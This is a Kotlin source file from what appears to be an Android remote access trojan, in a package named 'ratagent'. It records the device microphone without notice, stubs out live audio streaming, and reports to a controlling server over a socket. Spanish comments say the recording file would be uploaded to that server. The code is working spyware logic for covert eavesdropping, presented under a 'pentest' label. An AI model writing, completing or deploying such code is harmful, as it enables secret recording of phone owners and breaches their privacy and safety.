package com.pentest.ratagent
import android.media.MediaRecorder
import java.io.File
// Dentro de AudioRecorder.kt para streaming
fun startLiveMic() {
    val bufferSize = 1024
    val audioData = ShortArray(bufferSize)
    // Leer del micro y socket.emit("audio-stream", audioData)
}

object AudioRecorder {
    private var recorder: MediaRecorder? = null

    fun record(context: android.content.Context, seconds: Int) {
        val file = File(context.cacheDir, "rec.mp3")
        recorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setOutputFile(file.absolutePath)
            prepare()
            start()
        }

        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            stopAndSend(file)
        }, (seconds * 1000).toLong())
    }

    private fun stopAndSend(file: File) {
        recorder?.stop()
        recorder?.release()
        recorder = null
        // Aquí enviarías el archivo al servidor vía Socket o Upload API
        SocketManager.socket?.emit("data", "Grabación lista en ${file.name}")
    }
}
